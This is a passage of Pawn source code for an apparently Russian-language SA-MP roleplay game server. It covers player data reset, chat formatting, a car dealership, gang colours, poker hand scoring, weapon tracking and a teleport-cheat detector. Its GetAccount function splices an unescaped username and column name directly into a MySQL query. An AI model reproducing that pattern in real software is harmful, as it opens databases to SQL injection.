for(new i = 0; i < 4; i++) getReg_player[playerid][i] = -1;
PlayerInJob[playerid] = 0; Meshok[playerid] = 0; Meshki[playerid] = 0; Oldskin2[playerid] = 0;
PlayerInfo[playerid][pModel] = 0; PlayerInfo[playerid][pChar] = 0; PlayerInfo[playerid][pSex] = 0;
PlayerInfo[playerid][pID] = 0; PlayerInfo[playerid][pWarn] = 0; PlayerInfo[playerid][pCash] = 0;
PlayerInfo[playerid][pExp] = 0; PlayerInfo[playerid][pLevel] = 0; PlayerInfo[playerid][pMuted] = 0;
PlayerInfo[playerid][pAge] = 0; PlayerInfo[playerid][pBank] = 0; PlayerInfo[playerid][pAdmin] = 0;
PlayerInfo[playerid][pNews] = 0; PlayerInfo[playerid][pJail] = 0; PlayerInfo[playerid][pJailTime] = 0;
PlayerInfo[playerid][pWanted] = 0; PlayerInfo[playerid][pWantedTime] = 0; PlayerInfo[playerid][pDrugs] = 0;
PlayerInfo[playerid][pMats] = 0; PlayerInfo[playerid][pCheckTime] = 0; PlayerInfo[playerid][pPick] = 0;
PlayerInfo[playerid][pJob] = 0; PlayerInfo[playerid][pMarried] = false; PlayerInfo[playerid][pPayCheck] = 0;
PlayerInfo[playerid][pLottery] = 0; PlayerInfo[playerid][pVIP] = false; PlayerInfo[playerid][pTime] = 0;
PlayerInfo[playerid][pFightStyle] = 0; PlayerInfo[playerid][pCredits] = 0; PlayerInfo[playerid][pTotalCredits] = 0;
PlayerInfo[playerid][pSkin1] = 0; PlayerInfo[playerid][pSkin2] = 0; PlayerInfo[playerid][pSkin3] = 0;
PlayerInfo[playerid][pGunSkill][0] = 0; PlayerInfo[playerid][pGunSkill][1] = 0; PlayerInfo[playerid][pGunSkill][2] = 0;
PlayerInfo[playerid][pGunSkill][3] = 0; PlayerInfo[playerid][pGunSkill][4] = 0; PlayerInfo[playerid][pGunSkill][5] = 0;
PlayerInfo[playerid][pSatiety] = 0; PlayerInfo[playerid][pHealthS] = 100.000;
PlayerInfo[playerid][pZakon] = 0; PlayerInfo[playerid][ProverkaIP]= 0; PlayerInfo[playerid][pDostup] = 74663823;
strmid(PlayerName[playerid], "None", 0, strlen("None"), MAX_PLAYER_NAME);
return true;
}
//==============================================================================
stock SendMesToAll(color, fstring[], {Float, _}:...)
{
static const
STATIC_ARGS = 2;
new
n = (numargs() - STATIC_ARGS) * BYTES_PER_CELL;
if (n)
{
new
message[145],
arg_start,
arg_end;
#emit CONST.alt        fstring
#emit LCTRL          5
#emit ADD
#emit STOR.S.pri        arg_start

#emit LOAD.S.alt        n
#emit ADD
#emit STOR.S.pri        arg_end
do
{
#emit LOAD.I
#emit PUSH.pri
arg_end -= BYTES_PER_CELL;
#emit LOAD.S.pri      arg_end
}
while (arg_end > arg_start);
// Push the static format parameters.
#emit PUSH.S          fstring
#emit PUSH.C          145
#emit PUSH.ADR         message

n += BYTES_PER_CELL * 3;
#emit PUSH.S          n
#emit SYSREQ.C         format

n += BYTES_PER_CELL;
#emit LCTRL          4
#emit LOAD.S.alt        n
#emit ADD
#emit SCTRL          4

return SendClientMessageToAll(color, message);
}
else
{
return SendClientMessageToAll(color, fstring);
}
}
//==============================================================================
stock SendMes(playerid, color, fstring[], {Float, _}:...)
{
static const
STATIC_ARGS = 3;
new
n = (numargs() - STATIC_ARGS) * BYTES_PER_CELL;
if (n)
{
new
message[128],
arg_start,
arg_end;
#emit CONST.alt        fstring
#emit LCTRL          5
#emit ADD
#emit STOR.S.pri        arg_start

#emit LOAD.S.alt        n
#emit ADD
#emit STOR.S.pri        arg_end
do
{
#emit LOAD.I
#emit PUSH.pri
arg_end -= BYTES_PER_CELL;
#emit LOAD.S.pri      arg_end
}
while (arg_end > arg_start);

// Push the static format parameters.
#emit PUSH.S          fstring
#emit PUSH.C          128
#emit PUSH.ADR         message

n += BYTES_PER_CELL * 3;
#emit PUSH.S          n
#emit SYSREQ.C         format

n += BYTES_PER_CELL;
#emit LCTRL          4
#emit LOAD.S.alt        n
#emit ADD
#emit SCTRL          4

return SendClientMessage(playerid, color, message);
}
else
{
return SendClientMessage(playerid, color, fstring);
}
}
//==============================================================================
stock SetHealth(playerid, Float: Heal)
{
PlayerInfo[playerid][pHeal] = Heal;
SetPlayerHealth(playerid, Heal);
return true;
}
//==============================================================================
stock SetArmour(playerid, Float: Arm)
{
PlayerArmour[playerid] = Arm;
SetPlayerArmour(playerid, Arm);
return true;
}
//==============================================================================
stock LoadPWeapon(playerid)
{
sscanf(PlayerInfo[playerid][pGuns], "p<,>a<i>[13]",PlayerInfo[playerid][pGun]);
sscanf(PlayerInfo[playerid][pAmmos], "p<,>a<i>[13]",PlayerInfo[playerid][pAmmo]);
for(new i; i < 13; i++)
{
if(PlayerInfo[playerid][pGun][i] != 0 && PlayerInfo[playerid][pAmmo][i] != 0) GiveWeapon(playerid, PlayerInfo[playerid][pGun][i], PlayerInfo[playerid][pAmmo][i]);
}
SetWeaponFrac(playerid);
return true;
}
//==============================================================================
stock SetWeaponFrac(playerid)
{
if(PlayerInfo[playerid][pLevel] <= 1) return true;
switch(PlayerInfo[playerid][pMember])
{
case F_FBI: GiveWeapon(playerid,WEAPON_POLICE,250);
case F_GROVE, F_BALLAS, F_RIFA, F_AZTECAS, F_VAGOS: GiveWeapon(playerid,WEAPON_GAND,1);
case F_LCN: GiveWeapon(playerid,WEAPON_LCN,1);
case F_YAKUZA: GiveWeapon(playerid,WEAPON_YAKUZA,1);
case F_RM: GiveWeapon(playerid,WEAPON_RM,1);
case F_UNITEDNEWS: GiveWeapon(playerid,WEAPON_NEWS,30);
}
return true;
}
//==============================================================================
stock WeaponSkill(playerid)
{
if(PlayerInfo[playerid][pGunSkill][6] >= NORM_SKILLS_PLAYER) SetPVarInt(playerid,"AutoSkillBool", 0);
else if(PlayerInfo[playerid][pGunSkill][6] < NORM_SKILLS_PLAYER) SetPVarInt(playerid,"AutoSkillBool", 1);
return true;
}
//==============================================================================
stock CarDoors(vehicleid, status)
{
if(vehicleid==INVALID_VEHICLE_ID) return false;
new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
GetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, status, ebonnet, eboot, eobjective);
if(vehicleid < lastveh) SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, 0, ebonnet, eboot, eobjective);
return true;
}
//==============================================================================
stock GetInflationPrice(money) return money;
stock GetFractionPrice(taxfrac, money) return (taxfrac*money)/100;
//==============================================================================
stock GetPlayerHouse(playerid)
{
new house = 0;
for(new i = 1; i <= TOTALHOUSE;i++)
{
if(!strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pSendername],true)) house++, SetPVarInt(playerid, "PlayerHouse", i);
}
return house;
}
stock GetPlayerDach(playerid)
{
new dach = 0;
for(new i = 1; i <= TOTALDUCH;i++)
{
if(!strcmp(HouseInfo[i][dOwner],PlayerInfo[playerid][pSendername],true)) dach++, SetPVarInt(playerid, "PlayerDUCH", i);
}
return dach;
}
//==============================================================================
stock GetPlayerBizz(playerid)
{
new bizz = 0;
for(new i = 1; i <= TOTALBIZZ;i++)
{
if(!strcmp(BizzInfo[i][bOwner],PlayerInfo[playerid][pSendername],true)) bizz++, SetPVarInt(playerid, "PlayerBizz", i);
}
return bizz;
}
//==============================================================================
stock IsTheMember(member)
{
switch(member)
{
case F_MAYOR,F_POLICE_LS,F_POLICE_SF,F_FBI,F_HOSPITAL,F_ARMY,F_LIC: return true;
}
return false;
}
//==============================================================================
stock UnloadContent()
{
// Objects
// * Global
new testobj = CreateObject(971, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
DestroyObject(testobj);
for(new i; i < testobj; i++)
{
if(!IsValidObject(i)) continue;
DestroyObject(i);
}
// Personal
for(new i, j = GetMaxPlayers(); i != j; i++)
{
if(!IsPlayerConnected(i)) continue;
new pobj = CreatePlayerObject(i, 971, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
DestroyPlayerObject(i, pobj);
for(new k; k < pobj; k++)
{
if(!IsValidPlayerObject(i, k)) continue;
DestroyPlayerObject(i, k);
}
}
// 3D Labels
// * Global
new Text3D: tthreed = Create3DTextLabel("UNLOAD", 0x00000000, 0.0, 0.0, 0.0, 0.0, 0, 0);
Delete3DTextLabel(tthreed);
for(new Text3D: i; i < tthreed; i++)
{
Delete3DTextLabel(i);
}
// Personal
for(new i, j = GetMaxPlayers(); i != j; i++)
{
if(!IsPlayerConnected(i)) continue;
new PlayerText3D: ptthreed = CreatePlayer3DTextLabel(i, "UNLOAD", 0x00000000, 0.0, 0.0, 0.0, 0.0, 0, 0);
DeletePlayer3DTextLabel(i, ptthreed);
for(new PlayerText3D: k; k < ptthreed; k++)
{
DeletePlayer3DTextLabel(i, k);
}
}
// Gangzones
new gangzone = GangZoneCreate(0.0, 0.0, 0.0, 0.0);
GangZoneDestroy(gangzone);
for(new i; i < gangzone; i++)
{
GangZoneHideForAll(i);
GangZoneDestroy(i);
}
// Pickups
new tpickup = CreatePickup(1242, 23, 0.0, 0.0, 0.0, -1);
DestroyPickup(tpickup);
for(new i; i < tpickup; i++)
{
DestroyPickup(i);
}
// Textdraws
new Text: TD = TextDrawCreate(-10.0, -10.0, " ");
TextDrawDestroy(TD);
for(new Text: i; i < TD; i++)
{
TextDrawHideForAll(i);
TextDrawDestroy(i);
}
// Menus
new Menu:examplemenu = CreateMenu("UNLOAD", 2, 0.0, 0.0, 0.0, 0.0);
DestroyMenu(examplemenu);
for(new Menu: k; k < examplemenu; k++)
{
if(!IsValidMenu(k)) continue;
for(new i, j = GetMaxPlayers(); i != j; i++)
{
if(!IsPlayerConnected(i)) continue;
if(!GetPlayerMenu(i)) continue;
HideMenuForPlayer(k, i);
}
DestroyMenu(k);
}
// Vehicles
new tveh = CreateVehicle(400, 0.0, 0.0, 0.0, 0.0, -1, -1, -1);
DestroyVehicle(tveh);
for(new i; i < tveh; i++)
{
if(GetVehicleModel(i) == 0) continue;
DestroyVehicle(i);
}
return true;
}
//==============================================================================
stock sendername(playerid)
{
new heap = heapspace();
printf("sendername() STK %d", heap);
new name[MAX_PLAYER_NAME];
GetPlayerName(playerid, name, sizeof(name));
printf("sendername() STK %d (%d LOSS)", heapspace(), (heap - heapspace()));
return name;
}
//==============================================================================
stock SelectCar(playerid)
{
new string[128];
new Keys,ud,lr;
GetPlayerKeys(playerid,Keys,ud,lr);
if( (GetTickCount() - PlayerLastTick[playerid]) < 500 ) return true;
if(lr < 0)
{
pPressed[playerid]++;
DestroyVehicle(veh[playerid]);
if(InShop[playerid] == 1)
{
if(pPressed[playerid]>=sizeof(carsC))pPressed[playerid]=0;
veh[playerid]=CreateVehicle(carsC[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsC[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%d$",GetInflationPrice(carsC[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);
}
if(InShop[playerid] == 2)
{
if(pPressed[playerid]>=sizeof(carsB))pPressed[playerid]=0;
veh[playerid]=CreateVehicle(carsB[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsB[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%d$",GetInflationPrice(carsB[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);
}
if(InShop[playerid] == 3)
{
if(pPressed[playerid]>=sizeof(carsA))pPressed[playerid]=0;
veh[playerid]=CreateVehicle(carsA[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsA[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%d$",GetInflationPrice(carsA[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);

}
PlayerLastTick[playerid] = GetTickCount();
LinkVehicleToInterior(veh[playerid],3);
SetVehicleVirtualWorld(veh[playerid],playerid);
PutPlayerInVehicle(playerid,veh[playerid],0);
SetPlayerCameraPos(playerid,610.3172,-121.1384,997.9922);
SetPlayerCameraLookAt(playerid,616.1683,-124.3003,997.9922);
}
if(lr > 0)
{
pPressed[playerid]--;
DestroyVehicle(veh[playerid]);
if(InShop[playerid] == 1)
{
if(pPressed[playerid]<0)pPressed[playerid]=sizeof(carsC)-1;
veh[playerid]=CreateVehicle(carsC[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsC[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%d$",GetInflationPrice(carsC[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);
}
if(InShop[playerid] == 2)
{
if(pPressed[playerid]<0)pPressed[playerid]=sizeof(carsB)-1;
veh[playerid]=CreateVehicle(carsB[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsB[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%i$",GetInflationPrice(carsB[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);
}
if(InShop[playerid] == 3)
{
if(pPressed[playerid]<0)pPressed[playerid]=sizeof(carsA)-1;
veh[playerid]=CreateVehicle(carsA[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
format(string,64,"~w~%s",VehicleNameS[carsA[pPressed[playerid]][0]-400]);
TextDrawSetString(VehNazv[playerid],string);
format(string,64,"~g~%d$",GetInflationPrice(carsA[pPressed[playerid]][1]));
TextDrawSetString(VehCost[playerid],string);
}
PlayerLastTick[playerid] = GetTickCount();
LinkVehicleToInterior(veh[playerid],3);
SetVehicleVirtualWorld(veh[playerid],playerid);
PutPlayerInVehicle(playerid,veh[playerid],0);
SetPlayerCameraPos(playerid,610.3172,-121.1384,997.9922);
SetPlayerCameraLookAt(playerid,616.1683,-124.3003,997.9922);
}
if(Keys & KEY_CTRL_BACK) SPD(playerid, D_JOB+54, 1, "Цвета", "Введите цвет1 и цвет2 транспорта через запятую:", "Принять", "Отмена");
else if(Keys & KEY_CROUCH) SPD(playerid, D_JOINCARS+4, DIALOG_STYLE_MSGBOX, "Транспорт", "Вы хотите отменить покупку транспорта?", "Да", "Нет");
else if(Keys & KEY_SECONDARY_ATTACK)
{
switch(InShop[playerid])
{
case 1: format(string,64,"Вы хотите приобрести %s за %i$ ?",VehicleNameS[GetVehicleModel(veh[playerid])-400],GetInflationPrice(carsC[pPressed[playerid]][1]));
case 2: format(string,64,"Вы хотите приобрести %s за %i$ ?",VehicleNameS[GetVehicleModel(veh[playerid])-400],GetInflationPrice(carsB[pPressed[playerid]][1]));
case 3: format(string,64,"Вы хотите приобрести %s за %i$ ?",VehicleNameS[GetVehicleModel(veh[playerid])-400],GetInflationPrice(carsA[pPressed[playerid]][1]));
}
SPD(playerid,D_JOINCARS+3,DIALOG_STYLE_MSGBOX,"Купить транспорт",string,"Да","Нет");
}
return true;
}
//==============================================================================
stock SetPlayerTeamColor(playerid)
{
switch(PlayerInfo[playerid][pMember])
{
case F_MAYOR: return SetPlayerColor(playerid,0xBC331AFF);
case F_POLICE_LS: return SetPlayerColor(playerid,0x2641FEAA);
case F_POLICE_SF: return SetPlayerColor(playerid,0x2641FEAA);
case F_FBI: return SetPlayerColor(playerid,0x313131AA);
case F_HOSPITAL: return SetPlayerColor(playerid,0xA52A2AFF);
case F_LIC: return SetPlayerColor(playerid,0x3C67BCFF);
case F_GROVE: return SetPlayerColor(playerid, TEAM_GROVE_COLOR);
case F_BALLAS: return SetPlayerColor(playerid, TEAM_BALLAS_COLOR);
case F_RIFA: return SetPlayerColor(playerid, 0x83BFBFAA);
case F_AZTECAS: return SetPlayerColor(playerid, TEAM_AZTECAS_COLOR);
case F_VAGOS: return SetPlayerColor(playerid, TEAM_VAGOS_COLOR);
case F_YAKUZA: return SetPlayerColor(playerid,0xFF0000AA);
case F_ARMY: return SetPlayerColor(playerid,0x99663320);
case F_LCN: return SetPlayerColor(playerid,0xDDA701FF);
case F_RM: return SetPlayerColor(playerid,COLOR_GREY);

case F_REDDRAGON: return SetPlayerColor(playerid,COLOR_GREY);
case F_CASINO: return SetPlayerColor(playerid,COLOR_GREY);

case F_UNITEDNEWS: return SetPlayerColor(playerid,COLOR_LIGHTGREEN);
default: SetPlayerColor(playerid, 0xFFFFFF11);
}
return true;
}
//==============================================================================
stock GetNearestVehicle(playerid)
{
for(new i=0; i<MAX_VEHICLES; i++)
{
if(GetVehicleModel(i))
{
new Float:X,Float:Y,Float:Z;
GetVehiclePos(i,X,Y,Z);
if(PlayerToPoint(8.0, playerid, X, Y, Z)) return i;
}
}
return -1;
}
//==============================================================================
stock GetNearestVehicleMafia(playerid)
{
for(new i=0; i<MAX_VEHICLES; i++)
{
if(GetVehicleModel(i) == 482)
{
for(new p = 1; p <= TOTALVEH; p++)
{
if(VehInfo[p][vVehicle] == i && PlayerInfo[playerid][pMember] == VehInfo[p][vFr])
{
new Float:X,Float:Y,Float:Z;
GetVehiclePos(i,X,Y,Z);
if(IsPlayerInRangeOfPoint(playerid, 15.0, X, Y, Z)) return i;
}
}
}
}
return -1;
}
//==============================================================================
stock Convert(seconds, stringTo[], size = sizeof(stringTo))
{
stringTo[0] = 0x0;
new result[4];
result[0] = floatround(seconds / (3600 * 24));
result[1] = floatround(seconds / 3600);
result[2] = floatround((seconds / 60) - (result[1] * 60));
result[3] = floatround(seconds - ((result[1] * 3600) + (result[2] * 60)));
switch(result[0])
{
case 0:
{
switch(result[1])
{
case 0: format(stringTo,size,"%02d:%02d",result[2],result[3]);
default: format(stringTo,size,"%d:%02d:%02d",result[1],result[2],result[3]);
}
}
}
return stringTo;
}
//==============================================================================
stock GetXYInBackOfPlayer(const playerid, &Float:x, &Float:y, const Float:distance)
{
new Float:a; GetPlayerPos(playerid, x, y, a); GetPlayerFacingAngle(playerid, a);
if(IsPlayerInAnyVehicle(playerid))
{
new vid=GetPlayerVehicleID(playerid);
if(vid>0 && vid<=MAX_VEHICLES) GetVehicleZAngle(vid, a);
}
x -= (distance * floatsin(-a, degrees)); y -= (distance * floatcos(-a, degrees));
}
//==============================================================================
stock GetXYInBackOfVehicle(vehicleid, &Float:x, &Float:y,Float:distance)
{
if(vehicleid>0 && vehicleid<=MAX_VEHICLES)
{
new Float:a; GetVehiclePos(vehicleid, x, y, a);
GetVehicleZAngle(vehicleid, a);
x -= (distance * floatsin(-a, degrees)); y -= (distance * floatcos(-a, degrees));
}
}
//==============================================================================
stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
new Float:a;
GetPlayerPos(playerid, x, y, a);
if (IsPlayerInAnyVehicle(playerid)) GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
else GetPlayerFacingAngle(playerid, a);
x += (distance * floatsin(-a, degrees));
y += (distance * floatcos(-a, degrees));
return true;
}
//==============================================================================
stock SpecialVehicle(vehicleid)
{
switch(GetVehicleModel(vehicleid))
{
case /*<boats>*/452..454,446,430,484,595,493,472,473,/*</boats>*//*<planes>*/482,577,511,512,593,520,553,519,476,460,513/*</planes>*/: return true;
}
return false;
}
//==============================================================================
stock UnSurfCar(carid)
{
new cm=GetVehicleModel(carid);
if (cm==478) return true;
if (cm==403) return true;
if (cm==406) return true;
if (cm==422) return true;
for(new i = 0; i<MAX_PLAYERS; i++)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(GetPlayerSurfingVehicleID(i) == carid)
{
new Float:p[3]; GetPlayerPos(i,p[0],p[1],p[2]);
GetXYInBackOfPlayer(i,p[0],p[1],2.0);
SetPlayerPos(i,p[0],p[1],p[2]);
}
}
return true;
}
//==============================================================================
stock GetGangZoneColor(gangzonex)
{
new zx;
switch(GZInfo[gangzonex][gFrak])
{
case F_GROVE: zx = 0x00FF1465;
case F_BALLAS: zx = 0xFF00EB65;
case F_RIFA: zx = 0x0087FF65;
case F_AZTECAS: zx = 0x00EBFF65;
case F_VAGOS: zx = 0xFFC80065;
default: zx = 0xFFBE0065;
}
return zx;
}
//==============================================================================
stock GetVehFracColor(playerid)
{
new color;
switch(PlayerInfo[playerid][pMember])
{
case F_GROVE: color = 86;
case F_BALLAS: color = 85;
case F_RIFA: color = 93;
case F_AZTECAS: color = 2;
case F_VAGOS: color = 6;
case F_LCN: color = 65;
case F_YAKUZA: color = 6;
case F_RM: color = 0;
default: color = 0;
}
return color;
}
//==============================================================================
stock GetGZColorF(fnumber)
{
new zx;
switch(fnumber)
{
case 7: zx = 0x00FF1465;
case 8: zx = 0xFF00EB65;
case 9: zx = 0x0087FF65;
case 10: zx = 0x00EBFF65;
case 11: zx = 0xFFC80065;
}
return zx;
}
//==============================================================================
stock IsInAllowed(playerid)
{
for(new i =0;i<sizeof(allowedfactions);i++)
{
if(PlayerInfo[playerid][pMember] == allowedfactions[i]||PlayerInfo[playerid][pLeader] == allowedfactions[i]) return true;
}
return false;
}
//==============================================================================
stock IsInAllowedF(fnumbers)
{
for(new i =0;i<sizeof(allowedfactions);i++)
{
if(fnumbers == allowedfactions[i]) return true;
}
return false;
}
//==============================================================================
stock GetGangName(fnumbwer)
{
new string[32];
switch(fnumbwer)
{
case 7: format(string,32,"Grove Street Gang");
case 8: format(string,32,"The Ballas Gang");
case 9: format(string,32,"The Rifa Gang");
case 10: format(string,32,"The Aztecas Gang");
case 11: format(string,32,"The Vagos Gang");
}
return string;
}
/**************************************************************************/
stock IsPlayerInBandOnline(bandid)
{
for(new i=0; i < MAX_PLAYERS; i++)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(PlayerInfo[i][pMember] == bandid || PlayerInfo[i][pLeader] == bandid) return true;
}
return false;
}
//==============================================================================
stock PlayerToKvadrat(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
new Float:xxp,Float:yyp,Float:zzp;
GetPlayerPos(playerid, xxp, yyp, zzp);
if((xxp <= max_x && xxp >= min_x) && (yyp <= max_y && yyp >= min_y)) return true;
return false;
}
//==============================================================================
stock HasDuplicateValues(const array[], size = sizeof array)
{
for(new f = 0; f < size - 1; ++f)
{
for(new c = f + 1; c < size; ++c)
{
if(array[f] == array[c])
{
return true;
}
}
}
return false;
}
//==============================================================================
stock RandomNumber(value, array[], size = sizeof array)
{
for(new p = 0; p < size; p++) array[p] = random(value);
}
//==============================================================================
stock Swap (&a, &b)
{
new s;
s = a;
a = b;
b = s;
}
//==============================================================================
stock getwin(const cards[], &One_Pair_Type, &Two_Pair_Type)
{
new
i = 0,
getcolor,
straight;

getcolor = Color_Mask[cards[0]] | Color_Mask[cards[1]] | Color_Mask[cards[2]] | Color_Mask[cards[3]] | Color_Mask[cards[4]];
getcolor = getcolor & (getcolor - 1);
straight = (Bynary_Mask[cards[0]] | Bynary_Mask[cards[1]] | Bynary_Mask[cards[2]] | Bynary_Mask[cards[3]] | Bynary_Mask[cards[4]]);
if(getcolor == 0)
{
if(straight == 31) return ROYAL_FLUSH;
if(HasStraight(straight)) return STRAIGHT_FLUSH;
return FLUSH;
} else {
new
two_pair,
three_of_a_kind,
match[13];
for(i = 0; i < 5; i++)
{
match[cards[i] % 13]++;
}
for(i = 0; i < 13; i++)
{
switch(match[i])
{
case 2:
{
two_pair++;
if(two_pair == 1)
One_Pair_Type = i;
else if(two_pair == 2)
Two_Pair_Type = i;
}
case 3: three_of_a_kind++, One_Pair_Type = i;
case 4: return One_Pair_Type = i, FOUR_OF_A_KIND;
}
}
if(two_pair == 1 && three_of_a_kind == 1) return FULL_HOUSE;
if(two_pair == 2) return TWO_PAIR;
if(two_pair == 1) return ONE_PAIR;
if(three_of_a_kind == 1) return THREE_OF_A_KIND;
if(HasStraight(straight)) return STRAIGHT;
}
return HIGH_CARD;
}
//==============================================================================
stock HasStraight(straight)
{
switch(straight)
{
case 31, 62, 124, 248, 496, 992, 1984, 3968, 7936, 4111: return true;
}
return false;
}
//==============================================================================
stock GetAccount(username[], obtaining[])
{
new Query[128];
format(Query, 128, "SELECT %s FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", obtaining, username);
mysql_query(Query);
mysql_store_result();
if(mysql_fetch_row(Query) == 1)
{
mysql_free_result();
return Query;
}
return Query;
}
//==============================================================================
stock onCheckAirBrk(playerid)
{
if(IsPlayerConnected(playerid) && GetPVarInt(playerid, "AFK_Time") == 1)
if(IsPlayerConnected(playerid) && PlayerLogged[playerid] == 1 && PlayerSpawned[playerid] == 1)
{
if(PlayerInfo[playerid][pAdmin] != 0) return true;
new string[128];
new Float: currentPos[3], Float:distance;
GetPlayerPos( playerid, currentPos[0], currentPos[1], currentPos[2] );
distance = floatround( GetPlayerDistanceFromPoint(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]));
if(GetPVarInt(playerid, "AntiBreik") == 0 && GetPVarInt(playerid, "SpecBool") == 0  && GetPVarInt(playerid, "AFK_Time") < 2 && GetPVarInt(playerid,"AFK_Use") != 1)
{
if(GetPlayerState(playerid) == 2)
{
new car = GetPlayerVehicleID(playerid);
new modelveh = GetVehicleModel(car);
if(IsABoat(car) || IsAPlane(car) || modelveh == 402 || modelveh == 451 || modelveh == 411) return true;
}
if(distance > 1000)
{
KickEx(playerid,6131);
return true;
}
else if(distance < 300 && distance > 70)
{
format(string, 128, "[A] » %s (ID: %i) возможно использует s0beit (AirBrake или SH)", PlayerInfo[playerid][pSendername], playerid);
SendAdminMessage(COLOR_RED, string);
}
PlayerInfo[playerid][pPos_x] = currentPos[0];
PlayerInfo[playerid][pPos_y] = currentPos[1];
PlayerInfo[playerid][pPos_z] = currentPos[2];
}
}
return true;
}
//==============================================================================
stock GiveWeapon(playerid, weaponid, ammo)
{
GunCheckTime[playerid] = 5;
if (weaponid==1)
{
Weapon[playerid][wSlot0] += ammo;
}
else if (weaponid==2||weaponid==3||weaponid==4||weaponid==5||weaponid==6||weaponid==7||weaponid==8||weaponid==9)
{
Weapon[playerid][wSlot1] += ammo;
}
else if (weaponid==22||weaponid==23||weaponid==24)
{
Weapon[playerid][wSlot2] += ammo;
}
else if (weaponid==25||weaponid==26||weaponid==27)
{
Weapon[playerid][wSlot3] += ammo;
}
else if (weaponid==28||weaponid==29||weaponid==32)
{
Weapon[playerid][wSlot4] += ammo;
}
else if (weaponid==30||weaponid==31)
{
Weapon[playerid][wSlot5] += ammo;
}
else if (weaponid==33||weaponid==34)
{
Weapon[playerid][wSlot6] += ammo;
}
else if (weaponid==35||weaponid==36||weaponid==37||weaponid==38)
{
Weapon[playerid][wSlot7] += ammo;
}
else if (weaponid==16||weaponid==17||weaponid==18||weaponid==39)
{
Weapon[playerid][wSlot8] += ammo;
}
else if (weaponid==41||weaponid==42||weaponid==43)
{
Weapon[playerid][wSlot9] += ammo;
}
else if (weaponid==10||weaponid==11||weaponid==12||weaponid==13||weaponid==14||weaponid==15)
{
Weapon[playerid][wSlot10] += ammo;
}
else if (weaponid==44||weaponid==45)
{
Weapon[playerid][wSlot11] += ammo;
}
else if (weaponid==40)
{
Weapon[playerid][wSlot12] = ammo;
}
GivePlayerWeapon(playerid, weaponid, ammo);
}
//==============================================================================
stock CheckWeapon(playerid)
{
if(GunCheckTime[playerid] == 0)
{
new weaponid, ammo;
for (new i = 0; i < 13; i++)
{
GetPlayerWeaponData(playerid, i, weaponid, ammo);
if (weaponid==1)
{
if(Weapon[playerid][wSlot0] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot0] = ammo; }
}
else if (weaponid==2||weaponid==3||weaponid==4||weaponid==5||weaponid==6||weaponid==7||weaponid==8||weaponid==9)
{
if(Weapon[playerid][wSlot1] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot1] = ammo; }
}
else if (weaponid==22||weaponid==23||weaponid==24)
{
if(Weapon[playerid][wSlot2] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot2] = ammo; }
}
else if (weaponid==25||weaponid==26||weaponid==27)
{
if(Weapon[playerid][wSlot3] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot3] = ammo; }
}
else if (weaponid==28||weaponid==29||weaponid==32)
{
if(Weapon[playerid][wSlot4] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot4] = ammo; }
}
else if (weaponid==30||weaponid==31)
{
if(Weapon[playerid][wSlot5] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot5] = ammo; }
}
else if (weaponid==33||weaponid==34)
{
if(Weapon[playerid][wSlot6] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot6] = ammo; }
}
else if (weaponid==35||weaponid==36||weaponid==37||weaponid==38)
{
if(Weapon[playerid][wSlot7] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot7] = ammo; }
}
else if (weaponid==16||weaponid==17||weaponid==18||weaponid==39)
{
if(Weapon[playerid][wSlot8] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot8] = ammo; }
}
else if (weaponid==41||weaponid==42||weaponid==43)
{
